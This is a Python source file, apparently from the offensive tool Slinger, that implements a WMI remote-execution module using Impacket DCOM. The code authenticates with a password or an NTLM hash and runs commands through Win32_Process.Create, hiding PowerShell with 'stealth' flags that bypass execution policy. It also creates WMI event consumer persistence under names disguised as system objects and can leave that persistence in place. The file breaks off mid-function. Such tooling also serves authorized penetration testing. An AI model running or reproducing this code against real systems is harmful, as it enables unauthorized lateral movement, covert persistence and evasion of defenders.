import time
import sys
import os
from slingerpkg.utils.common import generate_random_string
from slingerpkg.utils.printlib import (
    print_debug,
    print_verbose,
    print_warning,
    print_good,
    print_bad,
    print_info,
)
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from slingerpkg.utils.common import set_config_value


class wmiexec:
    """WMI Command Execution Module - Traditional DCOM Implementation"""

    def __init__(self):
        print_debug("WMIExec Module Loaded!")

    def wmiexec_handler(self, args):
        """Main handler for wmiexec command - Routes to appropriate method"""
        # Only show IOC-relevant information in verbose mode
        host = getattr(self, "host", "Unknown")
        user = getattr(self, "username", "Unknown")
        print_verbose(f"WMI execution on {host} as {user}")

        if not self.check_if_connected():
            print_warning("You must be connected to a share to use WMI execution.")
            return

        # Handle endpoint info request BEFORE method routing
        if hasattr(args, "endpoint_info") and args.endpoint_info:
            print_verbose("Routing to endpoint info display")
            from slingerpkg.lib.wmi_namedpipe import WMINamedPipeExec

            return WMINamedPipeExec._show_endpoint_info(self)

        # Route to appropriate WMI method based on args.wmi_method
        wmi_method = getattr(args, "wmi_method", None)

        # If no method specified, default to dcom for backwards compatibility
        if not wmi_method:
            wmi_method = "dcom"
            print_verbose("No WMI method specified, defaulting to DCOM")

        print_verbose(f"WMI method: {wmi_method}")

        if wmi_method == "dcom":
            # Traditional DCOM method using this module
            print_verbose("Routing to traditional DCOM WMI execution")
            return self._handle_wmiexec_dcom(args)
        elif wmi_method == "event":
            # WMI Event Consumer method - implemented
            print_verbose("Routing to WMI Event Consumer execution")
            return self._handle_wmiexec_event(args)
        elif wmi_method == "task":
            # Route to the WMI Named Pipe module for task method
            print_verbose("Routing to WMI Task Scheduler execution (Named Pipe module)")
            if hasattr(self, "execute_wmi_command_namedpipe"):
                # Call the WMI Named Pipe execution directly
                from slingerpkg.lib.wmi_namedpipe import WMINamedPipeExec

                return WMINamedPipeExec.wmiexec_handler(self, args)
            else:
                print_bad(
                    f"WMI method '{wmi_method}' not available - WMI Named Pipe module not loaded"
                )
                print_info("Available methods: dcom, task, event")
                return
        else:
            print_bad(f"Unknown WMI method: {wmi_method}")
            print_info("Available methods: dcom, task, event")
            return

    def _handle_wmiexec_dcom(self, args):
        """Handle traditional DCOM WMI execution"""
        print_verbose("DCOM WMI execution (network artifact)")

        # Check for interactive mode
        if getattr(args, "interactive", False):
            print_verbose("Interactive DCOM shell session")
            return self._handle_interactive_dcom_shell(args)

        # Validate command argument for non-interactive mode
        if not args.command:
            print_warning("Command is required unless using --interactive mode")
            print_info("Use 'wmiexec dcom --help' for usage information")
            return

        print_verbose(f"DCOM command execution: {args.command}")

        try:
            # Execute command via WMI DCOM with optimized parameters
            result = self.execute_wmi_command(
                command=args.command,
                capture_output=not getattr(args, "no_output", False),
                timeout=getattr(args, "timeout", 30),
                output_file=getattr(args, "output", None),
                working_dir=getattr(args, "working_dir", "C:\\"),
                sleep_time=getattr(args, "sleep_time", 1.0),
                save_name=getattr(args, "save_name", None),
                raw_command=getattr(args, "raw_command", False),
                shell=getattr(args, "shell", "cmd"),
            )

            if result["success"]:
                print_good(
                    f"WMI execution completed. Process ID: {result['process_id']}"
                )
                if result.get("output"):
                    print(result["output"])
                if getattr(args, "output", None):
                    print_good(f"Output saved to: {args.output}")
            else:
                print_bad("WMI execution failed")
                print_info(f"Error: {result.get('error')}")
                print_info("Traditional DCOM WMI may be blocked by firewall/policy")

        except Exception as e:
            print_debug(str(e), sys.exc_info())
            print_bad(f"WMI execution error: {e}")

    def _handle_wmiexec_event(self, args):
        """Handle WMI Event Consumer execution"""
        print_bad("WMI Event Consumer method is not implemented yet")
        print_info(
            "This feature is under development and will be available in a future release"
        )
        print_info("Please use 'wmiexec dcom' or 'wmiexec task' methods instead")

        return {
            "success": False,
            "output": None,
            "error": "WMI Event Consumer method not implemented yet",
        }

    def _handle_list_persistent(self, args):
        """List all persistent Event Consumer objects on the target system"""
        print_info("Scanning for persistent WMI Event Consumer objects...")

        try:
            # Create connection to root\subscription namespace
            dcom, iWbemServices = self._create_wmi_connection_for_event_consumer()

            consumers = []
            filters = []
            bindings = []

            # Query CommandLineEventConsumers
            try:
                consumer_objects = iWbemServices.ExecQuery(
                    "SELECT * FROM CommandLineEventConsumer"
                )
                while True:
                    try:
                        consumer = consumer_objects.Next(0x1, 1)[0]
                        consumers.append(
                            {
                                "Name": str(consumer.Name or "Unknown"),
                                "ExecutablePath": str(
                                    consumer.ExecutablePath or "Unknown"
                                ),
                                "CommandLineTemplate": str(
                                    consumer.CommandLineTemplate or "Unknown"
                                ),
                            }
                        )
                    except Exception:
                        break
            except Exception as e:
                print_debug(f"Consumer query failed: {e}")

            # Query Event Filters
            try:
                filter_objects = iWbemServices.ExecQuery("SELECT * FROM __EventFilter")
                while True:
                    try:
                        event_filter = filter_objects.Next(0x1, 1)[0]
                        filters.append(
                            {
                                "Name": str(event_filter.Name or "Unknown"),
                                "Query": str(event_filter.Query or "Unknown"),
                            }
                        )
                    except Exception:
                        break
            except Exception as e:
                print_debug(f"Filter query failed: {e}")

            # Query Bindings
            try:
                binding_objects = iWbemServices.ExecQuery(
                    "SELECT * FROM __FilterToConsumerBinding"
                )
                while True:
                    try:
                        binding = binding_objects.Next(0x1, 1)[0]
                        bindings.append(
                            {
                                "Filter": str(binding.Filter or "Unknown"),
                                "Consumer": str(binding.Consumer or "Unknown"),
                            }
                        )
                    except Exception:
                        break
            except Exception as e:
                print_debug(f"Binding query failed: {e}")

            # Display results
            print_info(
                f"Found {len(consumers)} Event Consumers, {len(filters)} Event Filters, {len(bindings)} Bindings"
            )

            if consumers:
                print_good("\n📋 CommandLineEventConsumers:")
                for i, consumer in enumerate(consumers, 1):
                    print_info(f"  {i}. {consumer['Name']}")
                    print_info(f"     ExecutablePath: {consumer['ExecutablePath']}")
                    print_info(
                        f"     CommandLineTemplate: {consumer['CommandLineTemplate']}"
                    )

            if filters:
                print_good("\n🔍 Event Filters:")
                for i, event_filter in enumerate(filters, 1):
                    print_info(f"  {i}. {event_filter['Name']}")
                    print_info(f"     Query: {event_filter['Query']}")

            if bindings:
                print_good("\n🔗 FilterToConsumerBindings:")
                for i, binding in enumerate(bindings, 1):
                    print_info(f"  {i}. Filter: {binding['Filter']}")
                    print_info(f"     Consumer: {binding['Consumer']}")

            if not (consumers or filters or bindings):
                print_warning("No persistent Event Consumer objects found")
                print_info(
                    "Use --no-cleanup flag when creating Event Consumers to make them persistent"
                )

            # Cleanup connection
            try:
                dcom.disconnect()
            except:
                pass

            return {
                "success": True,
                "consumers": consumers,
                "filters": filters,
                "bindings": bindings,
                "total_objects": len(consumers) + len(filters) + len(bindings),
            }

        except Exception as e:
            print_bad(f"Failed to list persistent Event Consumers: {e}")
            return {"success": False, "error": str(e)}

    def _handle_trigger_only(self, args):
        """Handle trigger-only mode - just spawn a process to trigger existing Event Consumers"""
        print_info(f"Triggering existing Event Consumers by spawning: {args.trigger}")

        try:
            # Use the regular WMI command execution to spawn the trigger process
            print_verbose(
                f"Executing {args.trigger} via WMI to trigger any active Event Filters"
            )
            result = self.execute_wmi_command(
                command=args.trigger,
                capture_output=False,
                timeout=10,
            )

            if result and result.get("success"):
                print_good(f"✓ Trigger process spawned successfully: {args.trigger}")
                if result.get("process_id"):
                    print_info(f"Process ID: {result['process_id']}")
                print_info("Any active Event Consumers should now be triggered")
                return {
                    "success": True,
                    "trigger_process": args.trigger,
                    "process_id": result.get("process_id"),
                    "message": "Trigger executed successfully",
                }
            else:
                print_bad(f"✗ Failed to spawn trigger process: {args.trigger}")
                return {
                    "success": False,
                    "error": f"Failed to spawn {args.trigger}",
                    "details": result,
                }

        except Exception as e:
            print_bad(f"Trigger execution failed: {e}")
            return {"success": False, "error": str(e)}

    def _handle_interactive_event_shell(self, args):
        """Handle interactive Event Consumer shell session"""
        print_info("Starting WMI Event Consumer interactive shell...")
        print_info("Type 'exit' to quit the Event Consumer shell")
        print_warning(
            "NOTE: Event Consumer method creates temporary WMI persistence for each command"
        )
        print_warning(
            "Use single commands for better performance, or consider 'wmiexec task -i' for faster interactive mode"
        )

        # Determine shell prompt prefix
        shell_type = getattr(args, "shell", "cmd")
        if shell_type == "powershell":
            prompt_prefix = "PS-Event"
        else:
            prompt_prefix = "Event"

        print()
        session_output = []

        try:
            while True:
                try:
                    # Display prompt
                    prompt = f"{prompt_prefix} > "
                    command = input(prompt).strip()

                    if not command:
                        continue

                    if command.lower() in ["exit", "quit", "q"]:
                        break

                    # Execute command via Event Consumer
                    print_verbose(f"Executing via Event Consumer: {command}")
                    # Check for raw command flags separately
                    raw_command_flag = getattr(args, "raw_command", False)
                    raw_exec_value = getattr(args, "raw_exec", None)

                    result = self.execute_wmi_event_consumer(
                        command=command,
                        consumer_name=None,  # Auto-generate for each command
                        filter_name=None,  # Auto-generate for each command
                        trigger_delay=getattr(args, "trigger_delay", 5),
                        cleanup=not getattr(args, "no_cleanup", False),
                        timeout=getattr(args, "timeout", 30),
                        capture_output=not getattr(args, "no_output", False),
                        output_file=None,  # No file output in interactive mode
                        trigger_exe=getattr(args, "trigger_exe", "notepad.exe"),
                        system_mode=getattr(args, "system", False),  # --system flag
                        custom_remote_output=getattr(
                            args, "output", None
                        ),  # -o/--output flag
                        working_dir=getattr(args, "working_dir", "C:\\"),
                        shell=getattr(args, "shell", "cmd"),
                        use_batch=True,  # Always use batch approach
                        raw_command=raw_command_flag,  # --raw-command flag
                        raw_exec=raw_exec_value,  # --raw-exec value
                        custom_script_path=None,  # No custom script path in interactive
                        custom_script_name=getattr(
                            args, "script_name", None
                        ),  # Custom script name
                        exe_type=getattr(args, "exe", "cmd"),  # Use exe type from args
                    )

                    if result["success"]:
                        if (
                            result.get("output")
                            and result["output"]
                            != "Event consumer executed (no output captured)"
                        ):
                            print(result["output"])
                            session_output.append(f"{command}: {result['output']}")
                        else:
                            print_good("Command executed successfully (no output)")
                            session_output.append(f"{command}: [executed]")
                    else:
                        print_bad(
                            f"Command failed: {result.get('error', 'Unknown error')}"
                        )
                        session_output.append(
                            f"{command}: [FAILED] {result.get('error', '')}"
                        )

                except KeyboardInterrupt:
                    print("\nUse 'exit' to quit")
                    continue
                except EOFError:
                    break

        except Exception as e:
            print_bad(f"Interactive shell error: {e}")

        print_info("Event Consumer interactive shell session ended")
        return {
            "success": True,
            "output": f"Interactive session completed. Commands executed: {len(session_output)}",
            "session_commands": session_output,
            "error": None,
        }

    def execute_wmi_command(
        self,
        command,
        capture_output=True,
        timeout=30,
        output_file=None,
        working_dir="C:\\",
        sleep_time=1.0,
        save_name=None,
        raw_command=False,
        shell="cmd",
    ):
        """
        Execute command via WMI using traditional DCOM approach - Optimized Version

        Args:
            command: Command to execute
            capture_output: Whether to capture and return output
            timeout: Execution timeout in seconds
            output_file: Optional file to save output to
            working_dir: Working directory for command execution
            sleep_time: Time to sleep before capturing output (seconds)
            save_name: Custom filename for output capture (None = auto-generate)
            raw_command: Execute raw command without shell wrapper
            shell: Shell to use ('cmd' or 'powershell')

        Returns:
            dict with 'success', 'process_id', 'output', 'error' keys
        """
        print_verbose(f"Process created via WMI: {command} (Event ID 4688/1)")

        try:
            # Extract credentials properly
            lm_hash = ""
            nt_hash = ""
            if hasattr(self, "ntlm_hash") and self.ntlm_hash:
                if ":" in self.ntlm_hash:
                    lm_hash = self.ntlm_hash.split(":")[0]
                    nt_hash = self.ntlm_hash.split(":")[1]
                else:
                    nt_hash = self.ntlm_hash

            print_verbose("DCOM connection established (network artifact)")

            # Create DCOM connection exactly like Impacket's wmiexec.py
            dcom = DCOMConnection(
                self.host,
                self.username,
                getattr(self, "password", ""),
                getattr(self, "domain", ""),
                lm_hash,
                nt_hash,
                aesKey="",
                oxidResolver=True,
                doKerberos=getattr(self, "use_kerberos", False),
            )

            try:

                # Create WMI interface
                iInterface = dcom.CoCreateInstanceEx(
                    wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
                )
                iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
                iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
                iWbemLevel1Login.RemRelease()

                # Get Win32_Process class
                win32Process, _ = iWbemServices.GetObject("Win32_Process")

                # Always use current connected share for output capture
                # For WMI output capture, always default to C$ unless explicitly specified
                # This is because WMI output redirection via 127.0.0.1 needs a writable path
                detected_share = (
                    getattr(self, "current_share", None)
                    or getattr(self, "share", None)
                    or getattr(self, "connected_share", None)
                )

                if not detected_share or detected_share in ["IPC$", "PIPE$"]:
                    share_name = "C$"
                else:
                    share_name = detected_share

                # Prepare command based on shell and options
                if capture_output and not raw_command:
                    # Generate output filename (not needed for raw commands)
                    if save_name:
                        output_filename = save_name
                    else:
                        output_filename = f"{generate_random_string()}.txt"

                    print_verbose(
                        f"Output file: {output_filename} (filesystem artifact)"
                    )

                    # Create proper Windows file system path for output redirection
                    if share_name.endswith("$"):
                        # Convert C$ to C:\ for Windows file system path
                        drive_letter = share_name[0].upper()
                        output_path = (
                            f"{drive_letter}:\\Windows\\Temp\\{output_filename}"
                        )
                        print_verbose(
                            f"Output path: {output_path} (Windows filesystem path)"
                        )
                    else:
                        # Handle custom shares
                        output_path = f"\\\\127.0.0.1\\{share_name}\\{output_filename}"
                        print_verbose(f"Output path: {output_path} (UNC path)")

                    # Prepare command based on shell type and raw mode
                    if shell == "powershell":
                        # Enhanced PowerShell stealth execution
                        stealth_flags = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -NoLogo"
                        full_command = f'powershell.exe {stealth_flags} -Command "{command}" > "{output_path}" 2>&1'
                        print_verbose(
                            "PowerShell process creation (Event ID 4688/1) with stealth flags"
                        )
                    else:  # shell == 'cmd' (default)
                        full_command = (
                            f'cmd.exe /Q /c {command} 1> "{output_path}" 2>&1'
                        )
                else:
                    # STEP 1 FIX: No output capture, simplified command preparation
                    output_filename = None
                    print_verbose("STEP 1: No output capture mode")

                    # Prepare command based on shell type
                    if raw_command:
                        full_command = (
                            command  # Execute exactly as specified, no modifications
                        )
                    elif shell == "powershell":
                        # Enhanced PowerShell stealth execution (no output capture)
                        stealth_flags = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -NoLogo"
                        full_command = (
                            f'powershell.exe {stealth_flags} -Command "{command}"'
                        )
                        print_verbose(
                            "PowerShell process creation (Event ID 4688/1) with stealth flags"
                        )
                    else:  # shell == 'cmd' (default)
                        full_command = f"cmd.exe /Q /c {command}"

                # Execute via WMI Win32_Process.Create
                print_debug(f"Executing WMI command: {full_command}")
                result = win32Process.Create(full_command, working_dir, None)
                process_id = result.ProcessId
                return_value = result.ReturnValue

                print_verbose(f"Process created: PID {process_id} (Event ID 4688/1)")
                print_debug(
                    f"WMI execution result: ReturnValue={return_value}, PID={process_id}"
                )

                if return_value == 0:

                    # Capture output if enabled (but not for raw commands)
                    output_text = None
                    if capture_output and output_filename and not raw_command:
                        print_verbose(
                            f"Output file: {output_filename} (filesystem artifact)"
                        )
                        print_debug(
                            f"Capturing command output after {sleep_time} second sleep"
                        )
                        time.sleep(sleep_time)

                        try:
                            # Use existing smblib methods for file operations
                            import tempfile

                            temp_local = tempfile.NamedTemporaryFile(delete=False).name

                            # If we need to access a different share for the output file, handle it
                            session_share = (
                                getattr(self, "current_share", None)
                                or getattr(self, "share", None)
                                or "C$"
                            )
                            print_verbose(
                                f"Session share: {session_share}, Target output share: {share_name}"
                            )
                            if share_name != session_share:
                                print_verbose(
                                    f"Temporarily switching to {share_name} for output capture"
                                )
                                # Save current share
                                saved_share = session_share
                                saved_tree_id = getattr(self, "tree_id", None)
                                print_verbose(
                                    f"Saved current state - Share: {saved_share}, TreeID: {saved_tree_id}"
                                )

                                try:
                                    # Calculate the correct SMB path for cross-share operations
                                    if share_name.endswith("$"):
                                        # File was written to C:\Windows\Temp\filename.txt
                                        cross_share_path = (
                                            f"Windows\\Temp\\{output_filename}"
                                        )
                                    else:
                                        cross_share_path = output_filename

                                    # Download the output file using low-level SMB operations
                                    print_verbose(
                                        f"Reading output file from {share_name} share: {cross_share_path}"
                                    )
                                    output_text = self._read_file_from_share(
                                        cross_share_path, share_name
                                    )
                                    print_verbose(
                                        f"Output captured: {len(output_text) if output_text else 0} characters"
                                    )

                                    # Clean up remote output file
                                    print_verbose(
                                        f"Cleaning up remote output file: {cross_share_path}"
                                    )
                                    self._delete_file_from_share(
                                        cross_share_path, share_name
                                    )

                                finally:
                                    # Restore original share connection
                                    if saved_tree_id:
                                        self.tree_id = saved_tree_id
                                        self.current_share = saved_share
                                        print_verbose(
                                            f"Restored original share connection: {saved_share}"
                                        )
                            else:
                                # Same share, use normal operations
                                print_verbose(
                                    f"Using same share ({session_share}) for output capture"
                                )

                                # Calculate the correct SMB path for the output file
                                if share_name.endswith("$"):
                                    # File was written to C:\Windows\Temp\filename.txt
                                    # SMB path should be Windows\Temp\filename.txt
                                    smb_output_path = (
                                        f"Windows\\Temp\\{output_filename}"
                                    )
                                    print_verbose(
                                        f"SMB download path: {smb_output_path}"
                                    )
                                else:
                                    smb_output_path = output_filename

                                self.download(smb_output_path, temp_local, echo=False)

                                # Read the content
                                print_verbose(
                                    f"Reading output from local temp file: {temp_local}"
                                )
                                with open(
                                    temp_local, "r", encoding="utf-8", errors="ignore"
                                ) as f:
                                    output_text = f.read().strip()
                                print_verbose(
                                    f"Output read: {len(output_text)} characters"
                                )

                                # Clean up local temp file
                                os.unlink(temp_local)
                                print_verbose("Local temp file cleaned up")

                                # Clean up remote output file using existing smblib method
                                print_verbose(
                                    f"Deleting remote output file: {smb_output_path}"
                                )
                                self.delete(smb_output_path)

                            if not output_text:
                                output_text = f"Command executed with PID {process_id}"
                        except Exception as e:
                            # Enhanced error handling for output capture failures
                            error_msg = str(e)
                            if (
                                "timed out" in error_msg
                                or "timeout" in error_msg.lower()
                            ):
                                print_warning(
                                    f"Output capture timed out - command may still be running"
                                )
                                output_text = f"Command executed with PID {process_id} (output capture timed out)"
                            elif (
                                "Broken pipe" in error_msg or "[Errno 32]" in error_msg
                            ):
                                print_warning("Connection lost during output capture")
                                if hasattr(self, "_handle_broken_pipe_error"):
                                    self._handle_broken_pipe_error("output capture")
                                output_text = f"Command executed with PID {process_id} (connection lost during output capture)"
                            elif "Error occurs while reading from remote" in error_msg:
                                print_warning(
                                    "Remote file read error - output file may not exist or be corrupted"
                                )
                                output_text = f"Command executed with PID {process_id} (remote file read error)"
                            else:
                                print_debug(f"Output capture failed: {e}")
                                output_text = f"Command executed with PID {process_id} (output capture failed)"
                    else:
                        if raw_command:
                            output_text = f"Raw command executed with PID {process_id} (no output capture)"
                        else:
                            output_text = f"Command executed with PID {process_id}"

                    # Save to file if requested
                    if output_file and output_text:
                        print_verbose(f"Saving output to file: {output_file}")
                        self._save_output_to_file(output_text, output_file)

                    return {
                        "success": True,
                        "output": output_text,
                        "process_id": process_id,
                        "error": None,
                    }
                else:
                    error_msg = (
                        f"Win32_Process.Create failed with return code: {return_value}"
                    )
                    return {
                        "success": False,
                        "output": None,
                        "process_id": None,
                        "error": error_msg,
                    }

            finally:
                try:
                    dcom.disconnect()
                except:
                    pass

        except Exception as e:
            print_debug(f"WMI execution failed: {e}")
            return {
                "success": False,
                "output": None,
                "process_id": None,
                "error": str(e),
            }

    def execute_wmi_event_consumer(
        self,
        command,
        consumer_name=None,
        filter_name=None,
        trigger_exe="notepad.exe",
        trigger_delay=8,
        cleanup=True,
        capture_output=True,
        output_file=None,
        system_mode=False,
        custom_remote_output=None,
        timeout=30,
        working_dir=None,
        shell=None,
        use_batch=None,
        custom_script_path=None,
        custom_script_name=None,
        exe_type="cmd",
        raw_command=False,
        raw_exec=None,
    ):
        """
        Execute command via WMI Event Consumer (official Microsoft implementation)

        This method creates a proper WMI Event Consumer subscription using Microsoft's
        official CommandLineEventConsumer, __EventFilter, and __FilterToConsumerBinding.

        Args:
            command: Command to execute
            consumer_name: Name for CommandLineEventConsumer (auto-generated if None)
            filter_name: Name for __EventFilter (auto-generated if None)
            trigger_exe: Executable to spawn for triggering Event Filter
            trigger_delay: Seconds to wait before triggering event
            cleanup: Whether to automatically cleanup WMI objects
            capture_output: Whether to capture command output
            output_file: Optional file to save output to
            system_mode: True=service context, False=interactive context
            custom_remote_output: Custom remote output file path
            timeout: Command execution timeout
            working_dir: Working directory for script execution
            shell: Shell type (cmd/powershell)
            use_batch: Whether to use batch file (legacy parameter)
            custom_script_path: Custom upload path for script
            custom_script_name: Custom script filename
            exe_type: Execution type (cmd/pwsh)
            raw_command: If True (--raw-command), put command directly into CommandLineTemplate, keep ExecutablePath as cmd.exe
            raw_exec: If string value provided (--raw-exec), put command directly into CommandLineTemplate, set ExecutablePath to the provided string

        Returns:
            dict with 'success', 'output', 'filter_name', 'consumer_name', 'error' keys
        """
        # Generate random names for stealth
        filter_name = filter_name or f"WinSysFilter_{generate_random_string()}"
        consumer_name = consumer_name or f"WinSysConsumer_{generate_random_string()}"

        # User-friendly status
        print_info(f"Creating WMI Event Consumer: {command}")
        print_verbose(
            f"Event Consumer artifacts: Filter={filter_name}, Consumer={consumer_name}"
        )
        print_verbose(f"Trigger executable: {trigger_exe}")
        print_debug(f"Flag status: raw_exec='{raw_exec}', raw_command={raw_command}")
        print_info(f"Input command for processing: '{command}'")
        if raw_exec is not None:
            if raw_exec == "":
                print_verbose(
                    f"Raw exec mode (--raw-exec): Command will be placed directly in CommandLineTemplate, ExecutablePath set to empty string"
                )
                print_info(
                    f"Mode: --raw-exec (ExecutablePath will be set to empty string)"
                )
            else:
                print_verbose(
                    f"Raw exec mode (--raw-exec): Command will be placed directly in CommandLineTemplate, ExecutablePath set to '{raw_exec}'"
                )
                print_info(
                    f"Mode: --raw-exec (ExecutablePath will be set to '{raw_exec}')"
                )
        elif raw_command:
            print_verbose(
                "Raw command mode (--raw-command): Command will be placed directly in CommandLineTemplate (ExecutablePath remains cmd.exe)"
            )
            print_info("Mode: --raw-command (ExecutablePath remains cmd.exe)")
        else:
            print_info("Mode: Standard (cmd.exe wrapper)")

        dcom = None
        iWbemServices = None

        try:
            # Step 1: Setup WMI connection to root\subscription namespace
            print_debug("Establishing WMI connection to root\\subscription namespace")
            dcom, iWbemServices = self._create_wmi_connection_for_event_consumer()

            # Step 2: Create CommandLineEventConsumer (official Microsoft implementation)
            print_debug("Creating CommandLineEventConsumer")
            # STEP 1: Disable Event Consumer output file generation (revert to original)
            output_filename = None
            print_debug("STEP 1: No Event Consumer output file generation")

            consumer_path = self._create_commandline_event_consumer(
                iWbemServices,
                consumer_name,
                command,
                working_dir,
                system_mode,
                raw_command,
                raw_exec,
            )
            print_info(f"✓ Event Consumer created: {consumer_name}")

            # Step 3: Create __EventFilter (official Microsoft implementation)
            print_debug("Creating __EventFilter")
            filter_path = self._create_official_event_filter(
                iWbemServices, filter_name, trigger_exe
            )
            print_info(f"✓ Event Filter created: {filter_name}")

            # Step 4: Create __FilterToConsumerBinding (official Microsoft implementation)
            print_debug("Creating __FilterToConsumerBinding")
            self._create_official_filter_binding(
                iWbemServices, filter_path, consumer_path
            )
            print_info(f"✓ Event Consumer binding created")

            # Step 5: Trigger the event to execute the consumer
            print_info(f"Triggering event by spawning: {trigger_exe}")
            trigger_result = self.execute_wmi_command(
                f"cmd.exe /c start {trigger_exe}", capture_output=False
            )
            if trigger_result and trigger_result.get("success"):
                print_verbose(
                    f"Trigger executed successfully (PID: {trigger_result.get('process_id')})"
                )
            else:
                print_warning("Trigger execution may have failed")

            # Step 6: Wait for event consumer execution
            output_text = "Event consumer executed"
            if capture_output:
                print_info(
                    f"Waiting {trigger_delay} seconds for Event Consumer execution..."
                )
                print_debug(
                    f"Event Consumer should execute when {trigger_exe} process starts"
                )

                # Add extra wait time for first few seconds to allow Event Consumer to fully initialize
                initial_wait = 3
                print_debug(
                    f"Initial wait: {initial_wait} seconds for Event Consumer initialization"
                )
                time.sleep(initial_wait)

                print_debug(
                    f"Additional wait: {trigger_delay - initial_wait} seconds for command completion"
                )
                time.sleep(
                    max(0, trigger_delay - initial_wait)
                )  # Wait for event consumer to execute

                # Try to capture output from Event Consumer output file
                if output_filename:
                    try:
                        print_debug(
                            f"Attempting to retrieve Event Consumer output from: {output_filename}"
                        )
                        output_path = f"Windows\\Temp\\{output_filename}"

                        # Step 1: Check if output file exists with retries
                        file_found = False
                        max_retries = 3
                        retry_delay = 2

                        for attempt in range(max_retries):
                            try:
                                print_debug(
                                    f"Checking for output file existence (attempt {attempt + 1}/{max_retries})"
                                )
                                # Try to list the specific file to check existence
                                test_files = self.conn.listPath(
                                    getattr(self, "share", "C$"), output_path
                                )
                                if test_files:
                                    file_found = True
                                    file_size = test_files[0].get_filesize()
                                    print_debug(
                                        f"Output file found: {output_path} (size: {file_size} bytes)"
                                    )
                                    break
                            except Exception as check_e:
                                print_debug(
                                    f"File existence check {attempt + 1} failed: {check_e}"
                                )
                                if attempt < max_retries - 1:
                                    print_debug(
                                        f"Waiting {retry_delay} seconds before retry..."
                                    )
                                    time.sleep(retry_delay)

                        if not file_found:
                            print_warning(
                                f"Event Consumer output file was not created: {output_path}"
                            )
                            print_info(
                                "This may indicate the Event Consumer command did not execute successfully"
                            )

                            # Diagnostic: Check if we can find any evidence of execution
                            print_debug("Performing diagnostic checks...")
                            try:
                                # Check Windows Temp directory for any new files
                                temp_files = self.conn.listPath(
                                    getattr(self, "share", "C$"), "Windows\\Temp\\*"
                                )
                                recent_files = []
                                for f in temp_files[:10]:  # Check first 10 files
                                    if (
                                        not f.is_directory()
                                        and f.get_longname().endswith(".txt")
                                    ):
                                        recent_files.append(f.get_longname())
                                if recent_files:
                                    print_debug(
                                        f"Recent .txt files in temp: {recent_files}"
                                    )
                                else:
                                    print_debug(
                                        "No recent .txt files found in Windows\\Temp"
                                    )
                            except Exception as diag_e:
                                print_debug(f"Diagnostic check failed: {diag_e}")

                            output_text = (
                                "Event consumer executed (no output file created)"
                            )
                        else:
                            # Step 2: File exists, attempt to download
                            print_debug(
                                f"Downloading Event Consumer output file: {output_path}"
                            )
                            output_text = self._read_file_from_share(
                                output_path, getattr(self, "share", "C$")
                            )

                        if output_text and output_text.strip():
                            print_info("✓ Event Consumer output captured:")
                            print(output_text.strip())

                            # Save to file if requested
                            if output_file:
                                self._save_output_to_file(output_text, output_file)
                        else:
                            print_warning(
                                "Event Consumer output file is empty or missing"
                            )
                            output_text = "Event consumer executed (no output captured)"

                        # Clean up Event Consumer output file
                        try:
                            print_verbose(
                                f"Cleaning up Event Consumer output file: {output_path}"
                            )
                            self.delete(output_path)
                        except Exception as cleanup_e:
                            print_debug(
                                f"Cleanup of Event Consumer output file failed: {cleanup_e}"
                            )

                    except Exception as e:
                        print_debug(f"Event Consumer output capture failed: {e}")
                        output_text = "Event consumer executed (output capture failed)"

                # Try to capture output if custom output redirection was specified
                elif custom_remote_output:
                    try:
                        print_debug(
                            f"Attempting to retrieve output from: {custom_remote_output}"
                        )
                        output_text = self._read_file_from_share(
                            custom_remote_output, getattr(self, "share", "C$")
                        )

                        if output_text and output_text.strip():
                            print_info("✓ Event Consumer output captured:")
                            print(output_text.strip())

                            # Save to file if requested
                            if output_file:
                                with open(output_file, "w") as f:
                                    f.write(output_text)
                                print_info(f"Output saved to: {output_file}")
                        else:
                            print_info(
                                "⚠ Event Consumer executed but no output captured"
                            )
                            output_text = "Event consumer executed (no output captured)"

                        # Clean up remote output file
                        try:
                            self._delete_file_from_share(
                                custom_remote_output, getattr(self, "share", "C$")
                            )
                            print_debug("Remote output file cleaned up")
                        except Exception as cleanup_err:
                            print_debug(f"Output file cleanup failed: {cleanup_err}")

                    except Exception as output_err:
                        print_info("⚠ Event Consumer executed (output capture failed)")
                        print_debug(f"Output capture error: {output_err}")
                        output_text = "Event consumer executed (output capture failed)"
                else:
                    print_info(
                        "Event Consumer executed (no output redirection specified)"
                    )

            # Step 7: Cleanup WMI objects (unless disabled)
            if cleanup:
                print_debug("Cleaning up WMI Event Consumer objects")
                try:
                    self._cleanup_event_consumer_objects(
                        iWbemServices, filter_name, consumer_name
                    )
                    print_verbose("WMI Event Consumer artifacts cleaned")
                except Exception as e:
                    print_warning(f"Cleanup failed: {e}")
            else:
                print_info(f"WMI objects preserved: {filter_name}, {consumer_name}")
                print_verbose("Use --no-cleanup to keep persistence objects")

            # Final status
            print_info("✓ WMI Event Consumer execution completed")

            # Cleanup DCOM connection
            try:
                if dcom:
                    dcom.disconnect()
            except Exception as disconnect_error:
                print_debug(f"DCOM disconnect warning: {disconnect_error}")

            return {
                "success": True,
                "output": output_text or "Event consumer executed",
                "filter_name": filter_name,
                "consumer_name": consumer_name,
                "error": None,
            }

        except Exception as e:
            print_bad(f"WMI Event Consumer execution failed: {e}")
            print_debug(f"Error details: {str(e)}")

            # Attempt cleanup on failure
            if cleanup and iWbemServices:
                try:
                    print_debug("Attempting cleanup after failure")
                    self._cleanup_event_consumer_objects(
                        iWbemServices, filter_name, consumer_name
                    )
                except Exception as cleanup_error:
                    print_debug(f"Cleanup after failure also failed: {cleanup_error}")

            # Cleanup DCOM connection
            try:
                if dcom:
                    dcom.disconnect()
            except Exception:
                pass

            return {
                "success": False,
                "output": None,
                "filter_name": filter_name,
                "consumer_name": consumer_name,
                "error": str(e),
            }

    def _save_output_to_file(self, output, output_file):
        """Save output to local file"""
        try:
            with open(output_file, "w") as f:
                f.write(output)
            print_verbose(f"Output saved to: {output_file}")
        except Exception as e:
            print_warning(f"Could not save output to file: {e}")

    def _read_file_from_share(self, filename, share_name):
        """Read file from a specific share using smblib methods"""
        try:
            print_debug(f"Reading file {filename} from share {share_name}")

            # Store current share info
            original_share = getattr(self, "share", None)
